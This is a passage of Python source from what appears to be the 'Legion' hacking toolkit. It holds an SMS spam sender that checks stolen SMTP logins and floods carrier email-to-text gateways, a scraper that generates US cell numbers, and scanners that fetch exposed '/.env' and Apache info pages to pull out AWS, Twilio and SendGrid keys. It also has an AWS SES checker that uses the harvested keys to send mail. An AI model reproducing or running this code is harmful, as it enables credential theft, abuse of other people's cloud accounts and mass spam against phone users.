        if not os.path.isdir('SMS/SMTPS'):
            os.mkdir('SMS/SMTPS')
        try:
            self.numbers_fn = 'SMS/NUMBERS/' + os.listdir('SMS/NUMBERS')[0]
            with open(self.numbers_fn) as file:
                self.numbers = f'{fg[1]}{self.numbers_fn.split("/")[-1]}'
                self.targets = [x for x in file.read().splitlines() if x]
                if len(self.targets) == 0:
                    self.numbers = f'{fg[0]}NO NUMBERS FOUND'
        except IndexError:
            self.numbers = f'{fg[0]}NO FILE FOUND'
        try:
            self.smtps_fn = 'SMS/SMTPS/' + os.listdir('SMS/SMTPS')[0]
            with open(self.smtps_fn) as file:
                self.smtps = f'{fg[1]}{self.smtps_fn.split("/")[-1]}'
        except IndexError:
            self.smtps = f'{fg[0]}NO FILE FOUND'

    def configuration(self):
        if not os.path.isfile('sender_config.json'):
            config = {
                'sender_config': {
                    '__note_delay': 'Delay means time per second before sending next mail.',
                    'delay': 0,
                    '__note_thread_count': 'Threading Count to use to check if SMTP is live or dead.',
                    'thread_count' : 100,
                    'auto_delete_dead': False,
                    '__note_thread_count_send': 'Threading Count to use to send mail to the target numbers.',
                    'thread_count_send' : 50
            }}
            with open('sender_config.json', 'w+') as outfile:
                json.dump(config, outfile, indent=2)
        else:
            with open('sender_config.json') as outfile:
                config = json.load(outfile)
        #region Booleans
        if config['sender_config']['delay'] == 0:
            self.s1 = f'{fg[0]}{str(config["sender_config"]["delay"])}'
        else:
            self.s1 = f'{fg[1]}{str(config["sender_config"]["delay"])}'
        self.s2 = f'{fg[1]}{str(config["sender_config"]["thread_count"])}'
        self.s3 = f'{fg[1]}{str(config["sender_config"]["auto_delete_dead"])}'
        self.s4 = f'{fg[1]}{str(config["sender_config"]["thread_count_send"])}'
        self.config = config
        #endregion Booleans

    def banner(self):
        # region Banner
        print('''{3}=============;===========;()     {1}██████  ███▄ ▄███▓  ██████      ██████ ▓█████  ███▄    █ ▓█████▄ ▓█████  ██▀███
             {0}#{4}#{0}#{4}#{0}#{4}#{0}#{5}::::::     ▒██    ▒ ▓██▒▀█▀ ██▒▒██    ▒    ▒██    ▒ ▓█   ▀  ██ ▀█   █ ▒██▀ ██▌▓█   ▀ ▓██ ▒ ██▒
             {0}#{4}#{0}#{4}#{0}#{4}#{0}#{5}::::::     ░ ▓██▄   ▓██    ▓██░░ ▓██▄      ░ ▓██▄   ▒███   ▓██  ▀█ ██▒░██   █▌▒███   ▓██ ░▄█ ▒
             {0}#{4}#{0}#{4}#{0}#{4}#{0}#{5}::::::       ▒   ██▒▒██    ▒██   ▒   ██▒     ▒   ██▒▒▓█  ▄ ▓██▒  ▐▌██▒░▓█▄   ▌▒▓█  ▄ ▒██▀▀█▄
             {0}#{4}#{0}#{4}#{0}#{4}#{0}#{5}::::::     ▒██████▒▒▒██▒   ░██▒▒██████▒▒   ▒██████▒▒░▒████▒▒██░   ▓██░░▒████▓ ░▒████▒░██▓ ▒██▒
             {0}#{4}#{0}#{4}#{0}#{4}#{0}#{4}#{0}#{4}#{0}#{4}#{0}#     ▒ ▒▓▒ ▒ ░░ ▒░   ░  ░▒ ▒▓▒ ▒ ░   ▒ ▒▓▒ ▒ ░░░ ▒░ ░░ ▒░   ▒ ▒  ▒▒▓  ▒ ░░ ▒░ ░░ ▒▓ ░▒▓░
             {0}#{4}#{0}#{4}#{0}#{4}#{0}#{4}#{0}#{4}#{0}#{4}#{0}#     ░ ░▒  ░ ░░  ░      ░░ ░▒  ░ ░   ░ ░▒  ░ ░ ░ ░  ░░ ░░   ░ ▒░ ░ ▒  ▒  ░ ░  ░  ░▒ ░ ▒░
             {0}#{4}#{0}#{4}#{0}#{4}#{0}#{4}#{0}#{4}#{0}#{4}#{0}#     ░  ░  ░  ░      ░   ░  ░  ░     ░  ░  ░     ░      ░   ░ ░  ░ ░  ░    ░     ░░   ░
             {0}#{4}#{0}#{4}#{0}#{4}#{0}#{4}#{0}#{4}#{0}#{4}#{0}#           ░         ░         ░           ░     ░  ░         ░    ░       ░  ░   ░
             {0}#{4}#{0}#{4}#{0}#{4}#{0}#{4}#{0}#{4}#{0}#{4}#{0}#           ░         ░         ░           ░     ░  ░         ░    ░       ░  ░   ░
             {0}#{4}#{0}#{4}#{0}#{4}#{0}#{4}#{0}#{4}#{0}#{4}#{0}#                                                                 ░


\t{4}SMS CONFIGURATION
\t{1}───┬───────────────
\t   {1}└╼ {5}SMTPs      {6}> {f1}

\t{4}SENDER CONFIGURATION
\t{1}───┬────────────────
\t   {1}├╼ {5}Delay                 {6}> {s1}
\t   {1}├╼ {5}Threading Count       {6}> {s2}
\t   {1}├╼ {5}Auto Delete Dead SMTP {6}> {s3}
\t   {1}└╼ {5}Threading Count Send  {6}> {s4}
'''.format(
    fg[0], fg[5], fg[1], fg[2], fg[6], fg[3], fg[4],
    reset=reset, f1=self.smtps,
    s1=self.s1, s2=self.s2, s3=self.s3, s4=self.s4).replace('▒', f'{fg[0]}▒{fg[5]}').replace('░', f'{fg[0]}░{fg[5]}').replace('▓', f'{fg[0]}▓{fg[5]}'))
        error = False
        if 'NO FILE FOUND' in self.numbers:
            print(f'\t{fg[0]}[!] {fg[0]}Please provide {fg[6]}NUMBER LIST{fg[0]} on {fg[5]}({fg[1]}SMS/NUMBERS{fg[5]}){fg[0]}!')
            error = True
        if 'NO NUMBERS FOUND' in self.numbers:
            print(f'\t{fg[0]}[!] {fg[0]}Please provide {fg[6]}NUMBER LIST{fg[0]} on {fg[5]}({fg[1]}{self.numbers_fn}{fg[5]}){fg[0]}!')
            error = True
        if 'NO FILE FOUND' in self.smtps:
            print(f'\t{fg[0]}[!] {fg[0]}Please provide {fg[6]}SMTPS{fg[0]} on {fg[5]}({fg[1]}SMS/SMTPS{fg[5]}){fg[0]}!')
            error = True
        if error:
            sys.exit()
        # endregion Banner

    def menu(self):
        # region Menu
        print('''
\t{0}[{1}01{0}] {2}╾╼ {0}[{3}Alltel{0}]
\t{0}[{1}02{0}] {2}╾╼ {0}[{3}Amp'd Mobile{0}]
\t{0}[{1}03{0}] {2}╾╼ {0}[{3}AT&T{0}]
\t{0}[{1}04{0}] {2}╾╼ {0}[{3}Boost Mobile{0}]
\t{0}[{1}05{0}] {2}╾╼ {0}[{3}Cingular{0}]
\t{0}[{1}06{0}] {2}╾╼ {0}[{3}Cricket{0}]
\t{0}[{1}07{0}] {2}╾╼ {0}[{3}Einstein PCS{0}]
\t{0}[{1}08{0}] {2}╾╼ {0}[{3}Nextel{0}]
\t{0}[{1}09{0}] {2}╾╼ {0}[{3}Sprint{0}]
\t{0}[{1}10{0}] {2}╾╼ {0}[{3}SunCom{0}]
\t{0}[{1}11{0}] {2}╾╼ {0}[{3}T-mobile{0}]
\t{0}[{1}12{0}] {2}╾╼ {0}[{3}VoiceStream{0}]
\t{0}[{1}13{0}] {2}╾╼ {0}[{3}US Cellular{0}]
\t{0}[{1}14{0}] {2}╾╼ {0}[{3}Verizon{0}]
\t{0}[{1}15{0}] {2}╾╼ {0}[{3}Virgin{0}]
'''.format(fg[5], fg[0], fg[2], fg[1]))
        # endregion Menu
        carriers = {
            '1': '@message.alltel.com',
            '2': '@vtext.com',
            '3': '@txt.att.net',
            '4': '@myboostmobile.com',
            '5': '@mobile.mycingular.com',
            '6': '@mms.mycricket.com',
            '7': '@einsteinmms.com',
            '8': '@messaging.nextel.com',
            '9': '@messaging.sprintpcs.com',
            '10': '@tms.suncom.com',
            '11': '@tmomail.net',
            '12': '@voicestream.net',
            '13': '@email.uscc.net',
            '14': '@vtext.com',
            '15': '@vmobl.com'
        }
        is_prompt = False
        while not is_prompt:
            print('\t{0}┌╼[{1}USA SMS Sender{0}]╾╼[{2}Choose Carrier to SPAM{0}]\n\t└─╼ '.format(fg[5], fg[0], fg[6]), end='')
            try:
                prompt = int(input(''))
                if prompt in [int(x) for x in carriers.keys()]:
                    self.carrier = carriers[str(prompt)]
                    is_prompt = True
                else:
                    print('\t{0}[{1}!{0}]╾╼[{2}Please enter a valid choice!{0}]'.format(fg[5], fg[0], fg[2]), end='\r')
                    time.sleep(1)
            except ValueError:
                print('\t{0}[{1}!{0}]╾╼[{2}Please enter a valid choice!{0}]'.format(fg[5], fg[0], fg[2]), end='\r')
                time.sleep(1)
        print('\t{0}┌╼[{1}USA SMS Sender{0}]╾╼[{2}Please enter your message {0}| {2}160 Max Characters{0}]\n\t└─╼ '.format(fg[5], fg[0], fg[6]), end='')
        self.message = input('')
        print('\t{0}┌╼[{1}USA SMS Sender{0}]╾╼[{2}Please enter sender email{0}]\n\t└─╼ '.format(fg[5], fg[0], fg[6]), end='')
        self.sender_email = input('')

    def log(self, msg, end='\n'):
        with lock:
            print(msg, end=end)

    def smtp_check(self):
        with open(self.smtps_fn) as file:
            self.smtp_servers = [x for x in file.read().splitlines() if x]
        self.smtp_servers = list(dict.fromkeys(self.smtp_servers))
        print('\t{0}╭╼[ {1}CHECKING SMTPS {0}]╾─╼[ {2}{3} {0}]'.format(fg[5], fg[2], fg[1], str(len(self.smtp_servers))))

        if len(self.smtp_servers) == 0:
            print(f'\t{fg[0]}[!] {fg[0]}Please provide {fg[6]}SMTPS{fg[0]} on {fg[5]}({fg[1]}SMS/SMTPS{fg[5]}){fg[0]}!')
            sys.exit()
        else:
            def check(smtp):
                if self.config['sender_config']['auto_delete_dead']:
                    self.log('\t{0}╰╼[ {1}LIVE SMTPS {0}]╾─╼[ {2}{3} {0}]'.format(fg[5], fg[2], fg[1], str(len(self.smtps))), end='\r')
                else:
                    self.log('\t{0}╰╼[ {1}LIVE SMTPS {0}]╾─╼[ {2}{3} {0}]╾─╼[ {1}DEAD SMTPS {0}]╾─╼[ {4}{5} ]'.format(fg[5], fg[2], fg[1], str(len(self.smtps)), fg[0], self.dead_count), end='\r')

                host, port, user, passwd = smtp.split('|')
                smtp_client = smtplib.SMTP_SSL if port == '465' else smtplib.SMTP
                try:
                    server = smtp_client(host, int(port), timeout=10)
                    server.ehlo_or_helo_if_needed()
                    if port != '465':
                        server.starttls()
                    server.login(user, passwd)
                    self.log('\t{0}│ [{1}LIVE{0}]╾╼[{2}{3}{0}]'.format(fg[5], fg[1], fg[6], smtp.replace('|', f'{fg[2]}|{fg[6]}')))
                    self.smtps[f'{user}|{passwd}'] = {
                        'host': host,
                        'port': port,
                        'user': user,
                        'pass': passwd,
                        'server': server
                    }
                except Exception as error:
                    self.dead_count += 1
                    auth_log.error('[{}] - [{}]'.format(host, str(error)))
                    self.log('\t{0}│ [{1}DEAD{0}]╾╼[{2}{3}{0}]'.format(fg[5], fg[0], fg[6], smtp.replace('|', f'{fg[2]}|{fg[6]}')))
                    if self.config['sender_config']['auto_delete_dead']:
                        with open(self.smtps_fn) as file:
                            saved = file.read().splitlines()
                        with open(self.smtps_fn, 'w+') as file:
                            for saved_smtp in saved:
                                if saved_smtp != smtp:
                                    file.write(f'{saved_smtp}\n')
                if self.config['sender_config']['auto_delete_dead']:
                    self.log('\t{0}╰╼[ {1}LIVE SMTPS {0}]╾─╼[ {2}{3} {0}]╾─╼[ {1}DEAD SMTPS {0}]╾─╼[ {4}{5} {0}]'.format(fg[5], fg[2], fg[1], str(len(self.smtps)), fg[0], self.dead_count), end='\r')
                else:
                    self.log('\t{0}╰╼[ {1}LIVE SMTPS {0}]╾─╼[ {2}{3} {0}]'.format(fg[5], fg[2], fg[1], str(len(self.smtps))), end='\r')

            def worker():
                while True:
                    try:
                        smtp = self.smtp_servers.pop()
                    except IndexError:
                        break

                    try:
                        check(smtp)
                    except:
                        pass

            self.smtps = {}
            self.dead_count = 0
            thread_count = int(self.config['sender_config']['thread_count'])
            if thread_count > len(self.smtp_servers):
                thread_count = len(self.smtp_servers)
            threads = []
            for _ in range(thread_count):
                t = Thread(target=worker)
                t.start()
                threads.append(t)
            for thread in threads:
                thread.join()
            #for smtp in self.smtp_servers:
            #    check(smtp)

    def send_mail(self):
        def send(tnumber):
            # VARIABLES
            smtp = self.smtps[list(self.smtps.keys())[self.scounter]]
            server = smtp['server']

            self.log('\t{0}╰╼[ {1}CURRENT SMTP SERVER {0}]╾─╼[ {2}{3} {0}]'.format(fg[5], fg[2], fg[1], smtp['host']), end='\r')

            msg = EmailMessage()
            msg['From'] = self.sender_email
            msg['To'] = tnumber + self.carrier
            msg.set_content(self.message)
            try:
                with lock:
                    server.send_message(msg)
                self.log('\t{0}│ [{1}{2}{0}]╾╼[{3}SENT{0}]╾╼[{4}{5}{0}]╾╼[{6}{7}{0}]'.format(fg[5], fg[4], ntime(), fg[1], fg[3], smtp['user'], fg[2], tnumber))
            except Exception as error:
                if any(str(error) in x for x in ['please run connect', 'Connection unexpectedly closed', 'Temporary local problem', 'too many messages']):
                    with lock:
                        smtp_client = smtplib.SMTP_SSL if smtp['port'] == '465' else smtplib.SMTP
                        server = smtp_client(smtp['host'], int(smtp['port']), timeout=10)
                        server.ehlo_or_helo_if_needed()
                        if smtp['port'] != '465':
                            server.starttls()
                        server.login(smtp['user'], smtp['passwd'])
                        smtp['server'] = ''
                        smtp['server'] = server
                        send(tnumber)
                else:
                    send_log.error('[{}] - [{}]'.format(smtp['host'], str(error)))
                    self.log('\t{0}│ [{1}{2}{0}]╾╼[{3}FAIL{0}]╾╼[{4}{5}{0}]╾╼[{6}{7}{0}]'.format(fg[5], fg[4], ntime(), fg[0], fg[3], smtp['user'], fg[2], tnumber))
                    with lock:
                        self.scounter += 1
                    send(tnumber)
            finally:
                time.sleep(int(self.config['sender_config']['delay']))
                self.log('\t{0}╰╼[ {1}CURRENT SMTP SERVER {0}]╾─╼[ {2}{3} {0}]'.format(fg[5], fg[2], fg[1], smtp['host']), end='\r')

        def worker():
            while True:
                try:
                    number = self.targets.pop()
                except IndexError:
                    break

                try:
                    send(number)
                except:
                    pass

        self.scounter = 0
        thread_count = int(self.config['sender_config']['thread_count_send'])
        if thread_count > len(self.targets):
            thread_count = len(self.targets)
        print('\n\n\t{0}╭╼[ {1}Sending MAILS {0}]╾─╼[ {2}SMTP SERVERS : {3}{4} {0}]'.format(fg[5], fg[2], fg[6], fg[1], str(len(self.smtps))))
        for _ in range(thread_count):
            t = Thread(target=worker)
            t.start()
        #for email in self.targets:
        #    send(email)


class BatchUSGen:
    def __init__(self):
        #self.banner()
        self.menu()
        self.generate()

    def test(self):
        query = requests.get('https://www.randomphonenumbers.com/us_phone_number/307313-xxxx')
        s = BeautifulSoup(query.text, 'html.parser')

    def banner(self):
        # region Banner
        print('''{0} _______       __  ___________  ______    __    __   {1}____  ____   ________  {2}_______    _______  _____  ___
{0}|   _  "\     /""\("     _   ")/" _  "\  /" |  | "\ {1}("  _||_ " | /"       ){2}/" _   "|  /"     "|(\\"   \|"  \\
{0}(. |_)  :)   /    \)__/  \\\\__/(: ( \___)(:  (__)  :){1}|   (  ) : |(:   \___/{2}(: ( \___) (: ______)|.\\\\   \    |
{0}|:     \/   /' /\  \  \\\\_ /    \/ \      \/      \/ {1}(:  |  | . ) \___  \   {2}\/ \       \/    |  |: \.   \\\\  |
{0}(|  _  \\\\  //  __'  \ |.  |    //  \ _   //  __  \\\\{1}  \\\\ \__/ //   __/  \\\\  {2}//  \ ___  // ___)_ |.  \    \. |
{0}|: |_)  :)/   /  \\\\  \\\\:  |   (:   _) \ (:  (  )  :) {1}/\\\\ __ //\  /" \   :){2}(:   _(  _|(:      "||    \    \ |
{0}(_______/(___/    \___)\__|    \_______) \__|  |__/ {1}(__________)(_______/  {2}\_______)  \_______) \___|\____\)

'''.format(fg[1], fg[3], fg[0]))
        # endregion Banner

    def menu(self):
        if not os.path.isdir('Generator'):
            os.mkdir('Generator')
        if not os.path.isdir('Generator/Carriers'):
            os.mkdir('Generator/Carriers')
        states = {
            'AK': 'Alaska',
            'AL': 'Alabama',
            'AR': 'Arkansas',
            'AZ': 'Arizona',
            'CA': 'California',
            'CO': 'Colorado',
            'CT': 'Connecticut',
            'DC': 'District of Columbia',
            'DE': 'Delaware',
            'FL': 'Florida',
            'GA': 'Georgia',
            'HI': 'Hawaii',
            'IA': 'Iowa',
            'ID': 'Idaho',
            'IL': 'Illinois',
            'IN': 'Indiana',
            'KS': 'Kansas',
            'KY': 'Kentucky',
            'LA': 'Louisiana',
            'MA': 'Massachusetts',
            'MD': 'Maryland',
            'ME': 'Maine',
            'MI': 'Michigan',
            'MN': 'Minnesota',
            'MO': 'Missouri',
            'MS': 'Mississippi',
            'MT': 'Montana',
            'NC': 'North Carolina',
            'ND': 'North Dakota',
            'NE': 'Nebraska',
            'NH': 'New Hampshire',
            'NJ': 'New Jersey',
            'NM': 'New Mexico',
            'NV': 'Nevada',
            'NY': 'New York',
            'OH': 'Ohio',
            'OK': 'Oklahoma',
            'OR': 'Oregon',
            'PA': 'Pennsylvania',
            'RI': 'Rhode Island',
            'SC': 'South Carolina',
            'SD': 'South Dakota',
            'TN': 'Tennessee',
            'TX': 'Texas',
            'UT': 'Utah',
            'VA': 'Virginia',
            'VT': 'Vermont',
            'WA': 'Washington',
            'WI': 'Wisconsin',
            'WV': 'West Virginia',
            'WY': 'Wyoming'
        }
        for x, y in states.items():
            print('\t{0}[{1}{4}{0}] {2}╾╼ {0}[{3}{5}{0}]'.format(fg[5], fg[0], fg[2], fg[1], x, y))
        print('\n')
        is_prompt = False
        while not is_prompt:
            print('\t{0}┌╼[{1}USA SMS Sender{0}]╾╼[{2}Choose Carrier to SPAM{0}]\n\t└─╼ '.format(fg[5], fg[0], fg[6]), end='')
            prompt = input('')
            if prompt.upper() in [x for x in states.keys()]:
                self.state = states[prompt.upper()]
                is_prompt = True
            elif prompt.lower() in [x.lower() for x in states.values()]:
                for k, v in states.items():
                    if prompt.lower() == v.lower():
                        self.state = states[k]
                is_prompt = True
            else:
                print('\t{0}[{1}!{0}]╾╼[{2}Please enter a valid state!{0}]'.format(fg[5], fg[0], fg[2]), end='\r')
                time.sleep(1)

    def log(self, msg, end='\n'):
        with lock:
            print(msg, end=end)

    def generate(self):
        print('\n\n\t{0}╭╼[ {1}Starting Service {0}]\n\t│'.format(fg[5], fg[6]))
        url = f'https://www.randomphonenumbers.com/US/random_{self.state}_phone_numbers'.replace(' ', '%20')
        print('\t{0}│ [ {1}WEBSITE LOADED{0} ] {2}{3}{0}'.format(fg[5], fg[2], fg[1], url))
        query = requests.get(url)
        soup = BeautifulSoup(query.text, 'html.parser')
        list = soup.find_all('ul')[2]
        urls = []
        for a in list.find_all('a', href=True):
            url = f'https://www.randomphonenumbers.com{a["href"]}'
            print('\t{0}│ [ {1}PARSING URLS{0}   ] {2}{3}'.format(fg[5], fg[2], fg[1], url), end='\r')
            urls.append(url)
            time.sleep(0.01)
        print(' ' * 100, end='\r')
        print('\t{0}│ [ {1}URLS PARSED{0}    ] {2}{3}\n\t│'.format(fg[5], fg[3], fg[1], len(urls)), end='\r')

        def generate_number(area_code, carrier):
            for char in string.punctuation:
                carrier = carrier.replace(char, ' ')
            numbers = ''
            for number in [area_code + str(x) for x in range(0000, 9999)]:
                if len(number) != 10:
                    gen = number.split(area_code)[1]
                    number = area_code + str('0' * (10-len(area_code)-len(gen))) + gen
                numbers += number + '\n'
            with open(f'Generator/Carriers/{carrier}.txt', 'a+') as file:
                file.write(numbers)


        def check_type(url):
            query_checkt = requests.get(url)
            soup = BeautifulSoup(query_checkt.text, 'html.parser')
            area_code = soup.find_all('div', {'class': 'col-md-7 col-sm-7 col-xs-7'})[0].getText()
            carrier = soup.find_all('div', {'class': 'col-md-7 col-sm-7 col-xs-7'})[8].getText()
            type = soup.find_all('div', {'class': 'col-md-7 col-sm-7 col-xs-7'})[10].getText()
            if 'Cell Phone' in type:
                self.area_codes.append(area_code)
                self.log('\t{0}│    ├─╼ {1}({2}{4}{1}) {3}{5}'.format(fg[5], fg[2], fg[1], fg[6], area_code, carrier))
                generate_number(area_code, carrier)
            else:
                self.log('\t{0}│    ├─╼ {1}({2}{4}{1}) {3}{5}'.format(fg[5], fg[2], fg[1], fg[6], area_code, carrier), end='\r')

        def worker():
            while True:
                try:
                    url = urls.pop()
                except IndexError:
                    break

                try:
                    check_type(url)
                except:
                    pass

        print('\t{0}│\n\t│ {1}Scraping Cell Phone Number Type\n\t{0}│ ───┬───────────────────────────'.format(fg[5], fg[2]))
        self.area_codes = []
        thread_count = 300
        if len(urls) < thread_count:
            thread_count = len(urls)
        threads = []
        for _ in range(thread_count):
            t = Thread(target=worker)
            t.start()
            threads.append(t)
        for thread in threads:
            thread.join()
        time.sleep(3)
        self.log('\t{0}│    └───╼[ {1}DONE {0}]\n\t│'.format(fg[5], fg[1]), end='\r')
        self.log('\t{0}└╼[ {1}FINISHED {0}]'.format(fg[5], fg[1]), end='\r')

#APACHE EXTRACT
headers = {'User-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36'}
def get_aws(url):
    try:
        get_source = requests.get(url, headers=headers, timeout=5, verify=False, allow_redirects=False).text

        # get key
        try:
            key = re.compile('class="v">(AKIA[0-9A-Z]{16})</')
            key.match(get_source)
            findallkey = key.findall(get_source)
            total_key = len(list(dict.fromkeys(findallkey)))
        except:
            return False

        try:
            secret = re.compile('class="v">([0-9a-zA-Z/+]{40})</')
            secret.match(get_source)
            finddall_secret = secret.findall(get_source)
        except:
            return False

        # get secret
        if total_key > 1:
            print(f'{gr}[{fc}Legion{gr}]{res} ' + url + f' {gr}╾┄╼ {res}HAVE {red}[{fc}' + str(total_key) + f'{red}] {red}└─╼ {res}AWSKEY' )
            open('Apache_Parse/awskey_double.txt','a').write(url + '\n')
        else:
            print(f'{gr}[{fc}Legion{gr}]{res} ' + url + f' {gr}╾┄╼  {red}[{gr}' + str(findallkey[0]) + f'{yl}|{gr}' + str(finddall_secret[0]) + f'{red}]')
            build_string = str(findallkey[0]) + '|' + str(finddall_secret[0]+'|')
            open('Apache_Parse/awskey.txt','a').write(build_string + '\n')
    except Exception as err:
        #print(str(err))
        return False
def get_twiliop(url):
	try:
		get_source = requests.get(url, headers=head, timeout=5, verify=False, allow_redirects=False).text

		# get sid
		try:
			key = re.compile('class="v">(AC[0-9a-fA-F]{32})</')
			key.match(get_source)
			findallkey = key.findall(get_source)
			total_key = len(list(dict.fromkeys(findallkey)))
		except:
			return False

		# get authtoken
		try:
			auth = re.compile('class="v">([0-9a-zA-Z/+]{69})</')
			auth.match(get_source)
			findallauth = auth.findall(get_source)
			total_auth = list(dict.fromkeys(findallauth))
		except:
			return False

		if total_key > 1:
			print(f'{gr}[{fc}Legion{gr}]{res} ' + url + f' {gr}╾┄╼ {res}HAVE {red}[{fc}' + str(total_key) + f'{red}] {red}└─╼ {res}TWILIO' )
			open('Apache_Parse/twilio_double.txt','a').write(url + '\n')
		else:
			if len(total_auth) > 1:
				for authtoken in total_auth:
					open('Apache_Parse/twilio_doubleauth.txt','a').write(str(findallkey[0]) + '|' + str(authtoken) + '\n')
					print(f'{gr}[{fc}Legion{gr}]{res} ' + url + f' {gr}╾┄╼  {red}[{gr}' + str(findallkey[0]) + f'{yl}|{gr}' + str(authtoken) + f'{red}]')
			else:
				open('Apache_Parse/twilio_singleauth.txt','a').write(str(findallkey[0]) + '|' + str(total_auth[0]) + '\n')
				print(f'{gr}[{fc}Legion{gr}]{res} ' + url + f' {gr}╾┄╼  {red}[{gr}' + str(findallkey[0]) + f'{yl}|{gr}' + str(total_auth[0]) + f'{red}]')
	except Exception as err:
		#print(str(err))
		return False
def get_twilio2(url):
	try:
		get_source = requests.get(url, headers=headers, timeout=5, verify=False, allow_redirects=False).text

		# get sid
		try:
			key = re.compile('class="v">(AC[0-9a-fA-F]{32})</')
			key.match(get_source)
			findallkey = key.findall(get_source)
			total_key = len(list(dict.fromkeys(findallkey)))
		except:
			return False

		# get authtoken
		try:
			auth = re.compile('class="v">([0-9a-fA-F]{32})</')
			auth.match(get_source)
			findallauth = auth.findall(get_source)
			total_auth = list(dict.fromkeys(findallauth))
		except:
			return False

		if total_key > 1:
			print(f'{gr}[{fc}Legion{gr}]{res} ' + url + f' {gr}╾┄╼ {res}HAVE {red}[{fc}' + str(total_key) + f'{red}] {red}└─╼ {res}TWILIO' )
			open('Apache_Parse/twilio_double.txt','a').write(url + '\n')
		else:
			if len(total_auth) > 1:
				for authtoken in total_auth:
					open('Apache_Parse/twilio_doubleauth.txt','a').write(str(findallkey[0]) + '|' + str(authtoken) + '\n')
					print(f'{gr}[{fc}Legion{gr}]{res} ' + url + f' {gr}╾┄╼  {red}[{gr}' + str(findallkey[0]) + f'{yl}|{gr}' + str(authtoken) + f'{red}]')
					legiontwilio(str(findallkey[0]), str(authtoken))
			else:
				open('Apache_Parse/twilio_singleauth.txt','a').write(str(findallkey[0]) + '|' + str(total_auth[0]) + '\n')
				print(f'{gr}[{fc}Legion{gr}]{res} ' + url + f' {gr}╾┄╼  {red}[{gr}' + str(findallkey[0]) + f'{yl}|{gr}' + str(total_auth[0]) + f'{red}]')


	except Exception as err:
		#print(str(err))
		return False
def get_sendgridp(url):
	try:
		get_source = requests.get(url, headers=headers, timeout=5, verify=False, allow_redirects=False).text

		# get sid
		try:
			key = re.compile('')
			key.match(get_source)
			findallkey = key.findall(get_source)
			total_key = len(list(dict.fromkeys(findallkey)))
		except:
			return False

		# get authtoken
		try:
			auth = re.compile('class="v">(SG.{67})</')
			auth.match(get_source)
			findallauth = auth.findall(get_source)
			total_auth = list(dict.fromkeys(findallauth))
		except:
			return False

		if total_key > 1:
			print(f'{gr}[{fc}Legion{gr}]{res} ' + url + f' {gr}╾┄╼ {res}HAVE {red}[{fc}' + str(total_key) + f'{red}] {red}└─╼ {res}TWILIO' )
			open('Apache_Parse/sendgrid_double.txt','a').write(url + '\n')
		else:
			if len(total_auth) > 1:
				for authtoken in total_auth:
					open('Apache_Parse/sendgrid_doubleauth.txt','a').write(str(findallkey[0]) + '|' + str(authtoken) + '\n')
					print(f'{gr}[{fc}Legion{gr}]{res} ' + url + f' {gr}╾┄╼  {red}[{gr}' + str(findallkey[0]) + f'{yl}|{gr}' + str(authtoken) + f'{red}]')
			else:
				open('Apache_Parse/sendgrid_singleauth.txt','a').write(str(findallkey[0]) + '|' + str(total_auth[0]) + '\n')
				print(f'{gr}[{fc}Legion{gr}]{res} ' + url + f' {gr}╾┄╼  {red}[{gr}' + str(findallkey[0]) + f'{yl}|{gr}' + str(total_auth[0]) + f'{red}]')
	except Exception as err:
		#print(str(err))
		return False
def EXPLOIT(url):
    try:
        paths = [
			'/.env'
            ]
        for path in paths:
            try:
                payload2 = url + path
                se3 = requests.session()
                Agent3 = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}
                ktn3 = se3.get(payload2, headers=Agent3, verify=False, timeout=30).text
                if 'APP_ENV' in ktn3 or 'APP_KEY' in ktn3 or 'APP_URL' in ktn3:
                    print (f'{fc}[{gr}SUCCESS ENV{fc}] {res}{url}{gr}{path}')
                    open('CMS/env.txt', 'a').write(url + '\n')
                    open('CMS/env_Path.txt', 'a').write(payload + '\n')
                    break
                else:
                    print (f'{yl} {fc}[{yl}NOT ENV{fc}] {res}{url}')
            except:
                print (f'{red} {fc}[{red}Not Vuln{fc}] {res}{url}')

    except:
        print (f'{red} Site Error !! {fc}[{red}Not Vuln{fc}] {res}{url} ')
#aws RANGER
def clearterm():
	if system() == 'Linux':
		os.system('clear')
	elif system() == 'Windows':
		os.system('cls')

def file_append(file, text):
	fp = open(file, 'a+')
	fp.write(text)
	fp.close()
	del fp

def put_content(file, text):
	fp = open(file, 'w')
	fp.write(text)
	fp.close()
	del fp

def get_content(file):
	try:
		fp = open(file, 'r')
		data = fp.read()
		fp.close()
		del fp
	except:
		data = ''
	return data.strip()

def chunks(l, n):
	n = max(1, n)
	return (l[i:i+n] for i in range(0, len(l), n))

def check(countsd, key, secret, region):
	try:
		out = ''
		client = boto3.client('ses', aws_access_key_id=key, aws_secret_access_key=secret, region_name=region)
		try:
			response = client.get_send_quota()
			frommail = client.list_identities()['Identities']
			if frommail:
				SUBJECT = "AWS Checker By @mylegion (Only Private Tools)"
				BODY_TEXT = "Region: {region}\r\nLimit: {limit}|{maxsendrate}|{last24}\r\nLegion PRIV8 Tools\r\n".format(key=key, secret=secret, region=region, limit=response['Max24HourSend'])
				CHARSET = "UTF-8"
				_to = emailnow
				for _from in frommail:
					try:
						SENDER = _from
						if '@' not in SENDER:
							SENDER = 'noreply@' + SENDER
						resp = client.send_email(
							Destination={
								'ToAddresses': [
									_to,
								],
							},
							Message={
								'Body': {
									'Text': {
										'Charset': CHARSET,
										'Data': BODY_TEXT,
									},
								},
								'Subject': {
									'Charset': CHARSET,
									'Data': SUBJECT,
								},
							},
							Source=SENDER,
						)
						out += f"{red}[{fc}AWS Checker{red}] {res}{key}{fc}|{res}{secret}{fc}|{fc}{region}{red}|{gr}{response['Max24HourSend']}{red}|{gr}{response['MaxSendRate']}{red}|{gr}{response['SentLast24Hours']}"
						out += f"|{SENDER}|Email Sent"
						file_append('Legion_AWS/Live.txt', f"{key}|{secret}|{region}|{response['Max24HourSend']}|{response['MaxSendRate']}|{response['SentLast24Hours']}\n")
						break
					except ClientError as e:
						out += f"{red}[{fc}AWS Checker{red}] {res}{key}{fc}|{res}{secret}{fc}|{fc}{region}{red}|{gr}{response['Max24HourSend']}{red}|{gr}{response['MaxSendRate']}{red}|{gr}{response['SentLast24Hours']}"
						out += f"|{SENDER}|{e.response['Error']['Message']}"
						if response['Max24HourSend'] == 200:
							file_append('Legion_AWS/LIMIT_sent.txt', f"{key}|{secret}|{region}|{response['Max24HourSend']}|{response['MaxSendRate']}|{response['SentLast24Hours']}\n")
						else:
